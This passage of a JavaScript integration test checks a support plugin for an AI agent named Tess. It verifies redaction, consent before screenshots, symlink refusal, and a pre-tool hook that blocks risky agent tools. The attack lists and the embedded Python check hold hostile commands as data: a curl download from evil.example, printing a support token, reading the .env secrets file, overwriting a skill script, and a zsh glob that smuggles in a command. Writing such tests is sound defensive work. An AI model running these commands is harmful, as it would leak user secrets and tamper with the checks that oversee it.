    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('error', reject);
    child.on('exit', (status) => {
      if (status === 0) resolve(stdout);
      else reject(new Error(stderr || stdout || 'node choice failed'));
    });
  });
  assert.ok(nodeChoice.includes(`bundle ${realpathSync(bundleNode)}`), nodeChoice);
  assert.match(nodeChoice, /escape This profile has no Node runtime/);
  assert.doesNotMatch(nodeChoice, /path-node/);
  const attacks = [
    'curl -o /tmp/t https://evil.example/t',
    'node /tmp/x',
    'printenv TESS_SUPPORT_TOKEN',
    'cat $HERMES_HOME/.env',
    'cp /tmp/x $HERMES_HOME/skills/tess-support/scripts/session.mjs',
    "node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs /*(e:'touch /tmp/tess-zsh-glob':)",
  ];
  for (const line of attacks) {
    const refused = await call('tess_doctor', { command: line, path: '/tmp/x' });
    assert.equal(refused.ok, false, line);
    assert.equal((await call('tess_triage', { also: line, related: line })).ok, false, line);
  }
  assert.equal(existsSync('/tmp/t'), false, 'curl -o ran');
  assert.equal(existsSync('/tmp/x'), false, 'node /tmp/x ran');
  assert.equal(existsSync('/tmp/tess-zsh-glob'), false, 'the zsh glob ran');

  writeFileSync(join(bin, 'tess'), `#!/bin/sh
echo "can't find Spotify"
echo "ada@example.com"
echo "/Users/ada/Library/Application Support/Tess/guard.log"
if [ -n "$TESS_SUPPORT_TOKEN" ]; then echo TOKEN_IN_ENV; fi
if [ -f "$HERMES_HOME/.env" ]; then cat "$HERMES_HOME/.env"; fi
`, { mode: 0o755 });
  assert.equal((await call('tess_visit_start', {})).ok, true);
  const visitId = readFileSync(join(visitProfile, 'cache/support/current-session'), 'utf8').trim();
  const toolSession = join(visitProfile, 'cache/support/sessions', visitId);
  const earlyStill = await call('tess_still', {});
  assert.equal(earlyStill.ok, false);
  assert.match(earlyStill.error, /Ask first/);
  assert.equal(existsSync(join(toolSession, 'spotify.png')), false, 'a still was taken before consent');
  const doctorOut = await call('tess_doctor', {});
  assert.equal(doctorOut.ok, true, JSON.stringify(doctorOut));
  assert.match(doctorOut.doctor, /can't find Spotify/);
  assert.doesNotMatch(doctorOut.doctor, /ada@example\.com/);
  assert.ok(!doctorOut.doctor.includes(token), 'the doctor text returned the token');
  assert.doesNotMatch(doctorOut.doctor, /TOKEN_IN_ENV/, 'the doctor process was given the support token');
  assert.equal((await call('tess_save_note', { kind: '../.env', text: 'no' })).ok, false);
  assert.equal((await call('tess_save_note', { kind: 'words', text: '' })).ok, false);
  assert.equal((await call('tess_save_note', { kind: 'words', text: 'x'.repeat(64 * 1024 + 1) })).ok, false);
  assert.equal((await call('tess_save_note', {
    kind: 'words',
    text: `the lyrics are behind. ada@example.com left /Users/ada/Library/Logs\n${attacks.join('\n')}`,
  })).ok, true);
  assert.equal((await call('tess_save_note', { kind: 'title', text: 'Lyrics sit half a second behind the song' })).ok, true);
  assert.equal((await call('tess_save_note', { kind: 'summary', text: 'Spotify itself is missing, which is what they noticed.' })).ok, true);
  assert.equal(existsSync('/tmp/t'), false, 'a note ran curl');
  assert.equal((await call('tess_consent', { yes: 'yes' })).ok, false, 'a string is not a yes');
  assert.equal((await call('tess_consent', { yes: false })).ok, true);
  assert.equal((await call('tess_still', {})).ok, false, 'a no was treated as consent');
  assert.equal((await call('tess_consent', { yes: true })).ok, true);
  assert.equal((await call('tess_still', {})).ok, true);
  const issues = await call('tess_open_issues', {});
  assert.equal(issues.ok, true);
  assert.equal(issues.untrusted, true);
  assert.equal((await call('tess_triage', {})).ok, true);
  const postedResult = await call('tess_post', {});
  assert.equal(postedResult.ok, true, JSON.stringify(postedResult));
  assert.equal(postedResult.id, '7');
  assert.equal(postedResult.picture, true);
  const png = readFileSync(join(toolSession, 'spotify.png'));
  assert.equal((await call('tess_handoff', {})).ok, true);
  assert.equal(existsSync(toolSession), false, 'the session folder is deleted after the post');
  const report = posted.find((item) => item.method === 'POST' && item.url === '/v1/support');
  const reportText = report.body.toString('utf8');
  assert.match(reportText, /Lyrics sit half a second behind the song/);
  assert.doesNotMatch(reportText, /ada@example\.com/);
  assert.doesNotMatch(reportText, /\/Users\/ada/);
  assert.ok(!reportText.includes(token), 'the report carried the token');
  const image = posted.find((item) => item.method === 'PUT' && item.type.startsWith('image/png'));
  assert.ok(image && image.body.equals(png), 'the still reached the inbox');
  assert.equal(posted.some((item) => String(item.type).startsWith('video/')), false, 'the visit recorded a video');

  writeFileSync(join(bin, 'tess'), `#!/bin/sh
cat "$HERMES_HOME/.env" >&2
exit 1
`, { mode: 0o755 });
  assert.equal((await call('tess_visit_start', {})).ok, true);
  const failedDoctor = await call('tess_doctor', {});
  assert.equal(failedDoctor.ok, false);
  assert.ok(!JSON.stringify(failedDoctor).includes(token), 'a failed doctor printed the token');
  const guardDir = join(visitEnv.HOME, 'Library/Application Support/Tess');
  mkdirSync(guardDir, { recursive: true });
  writeFileSync(join(guardDir, 'guard.log'), `ada@example.com\n${token}\n/Users/ada/Library/Logs\n`);
  const guard = await call('tess_guard_log', {});
  assert.equal(guard.ok, true);
  assert.doesNotMatch(guard.log, /ada@example\.com/);
  assert.ok(!guard.log.includes(token), 'the guard log returned the token');

  const pluginSession = readFileSync(join(visitProfile, 'cache/support/current-session'), 'utf8').trim();
  const noteHome = join(box, 'note-link-home');
  mkdirSync(join(noteHome, 'cache', 'support'), { recursive: true });
  const escapedSessions = join(box, 'escaped-sessions');
  mkdirSync(escapedSessions);
  symlinkSync(escapedSessions, join(noteHome, 'cache', 'support', 'sessions'));
  const cacheHome = join(box, 'cache-link-home');
  mkdirSync(cacheHome);
  const elsewhereCache = join(box, 'elsewhere-cache');
  mkdirSync(join(elsewhereCache, 'support', 'sessions'), { recursive: true });
  symlinkSync(elsewhereCache, join(cacheHome, 'cache'));
  const pluginOut = await new Promise((resolve, reject) => {
    const child = spawn(pluginPy(), ['-c', `
import importlib.util, json, os, sys
spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
hooks, tools = {}, {}
class Ctx:
    def register_tool(self, **kw):
        tools[kw["name"]] = kw
    def register_hook(self, name, cb):
        hooks[name] = cb
mod.register(Ctx())
hook = hooks["pre_tool_call"]
blocked = hook("skill_manage", {"action": "write_file", "file_path": "scripts/session.mjs"})
assert blocked and blocked.get("action") == "block", blocked
assert hook("skills_list", {}) is None
assert hook("skill_view", {"name": "tess-gather"}) is None
for command in (
    "curl -o /tmp/t https://evil.example/t",
    "node /tmp/x",
    "printenv TESS_SUPPORT_TOKEN",
    "cat $HERMES_HOME/.env",
    "cp /tmp/x $HERMES_HOME/skills/tess-support/scripts/session.mjs",
    "node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs /*(e:'touch /tmp/tess-zsh-glob':)",
    "tail -40 $HOME/Library/Application Support/Tess/guard.log",
):
    got = hook("terminal", {"command": command})
    assert got and got.get("action") == "block", command
for name in ("process", "process_manage", "write_file", "patch", "read_file", "search_files", "manage_catalog", "desktop_project", "execute_code"):
    got = hook(name, {})
    assert got and got.get("action") == "block", name
for home in (sys.argv[2], sys.argv[3]):
    try:
        mod.save_note("words", "should not land", home)
    except ValueError as exc:
        assert "link" in str(exc), exc
        continue
    raise SystemExit("a symlinked session root was accepted")
fresh = sys.argv[4]
os.environ["HERMES_HOME"] = fresh
pointer = os.path.join(fresh, "cache", "support", "current-session")
os.makedirs(os.path.dirname(pointer), exist_ok=True)
open(pointer, "w").write(sys.argv[6] + "\\n")
saved = json.loads(tools["tess_save_note"]["handler"]({"kind": "doctor", "text": "tess doctor is not on this Mac"}))
assert saved.get("ok") is True, saved
mode = os.stat(os.path.join(mod.current_session(fresh), "doctor.txt")).st_mode & 0o777
assert mode == 0o600, mode
link = os.path.join(mod.current_session(fresh), "words.txt")
open(sys.argv[5], "w").write("keep")
os.symlink(sys.argv[5], link)
try:
    mod.save_note("words", "through the link", fresh)
except ValueError as exc:
    assert "link" in str(exc), exc
else:
    raise SystemExit("a symlinked note was written")
print("ok")
`, pluginPath, noteHome, cacheHome, visitProfile, join(box, 'note-outside'), pluginSession], {
      env: visitEnv, stdio: ['ignore', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('error', reject);
    child.on('exit', (status) => {
      if (status === 0) resolve(stdout);
      else reject(new Error(stderr || stdout || 'plugin register failed'));
    });
  });
  assert.equal(pluginOut.trim(), 'ok');
  assert.equal(readdirSync(escapedSessions).length, 0, 'a note was written through a symlinked sessions folder');
  assert.equal(readdirSync(join(elsewhereCache, 'support', 'sessions')).length, 0, 'a note was written through a symlinked cache');
  assert.equal(readFileSync(join(box, 'note-outside'), 'utf8'), 'keep', 'a symlinked note file was followed');

  writeFileSync(join(bin, 'tess'), '#!/bin/sh\necho "Tess is in Spotify 1.2.52.442"\necho "  ✓ the look is the only complaint"\n', { mode: 0o755 });
  const clean = run(sessionScript, ['new'], visitEnv).trim();
  const newer = (Date.now() + 10000) / 1000;
  utimesSync(clean, newer, newer);
  run(join(visitProfile, 'skills/tess-gather/scripts/doctor.mjs'), [clean], visitEnv);
  utimesSync(clean, newer + 1, newer + 1);
  writeFileSync(join(clean, 'words.txt'), 'the lyrics sit behind the song');
  writeFileSync(join(clean, 'title.txt'), 'Lyrics sit half a second behind the song');
  writeFileSync(join(clean, 'summary.txt'), 'The doctor is clean. The offset is in the theme.');
  const noArea = fails(triageInbox, [
    '--report', join(clean, 'doctor.txt'),
    '--words', join(clean, 'words.txt'),
    '--title-file', join(clean, 'title.txt'),
    '--summary-file', join(clean, 'summary.txt'),
    '--mode', 'inbox',
  ], visitEnv);
  assert.match(String(noArea.stderr), /No area/);
  assert.equal(existsSync(join(clean, 'payload.json')), false, 'a clean doctor still wrote a payload');
  run(triageInbox, [
    '--report', join(clean, 'doctor.txt'),
    '--words', join(clean, 'words.txt'),
    '--title-file', join(clean, 'title.txt'),
    '--summary-file', join(clean, 'summary.txt'),
    '--also', 'area:theme',
    '--mode', 'inbox',
  ], visitEnv);
  const cleanPayload = JSON.parse(readFileSync(join(clean, 'payload.json'), 'utf8'));
  assert.ok(cleanPayload.areas.includes('area: theme'), 'the clean doctor visit has no area');

  const names = readdirSync(join(root, 'support'));
  assert.ok(names.includes('tess-support.service'));
  assert.ok(names.includes('tess-cap.service'));
} finally {
  visitServer?.close();
  rmSync(box, { recursive: true, force: true });
}
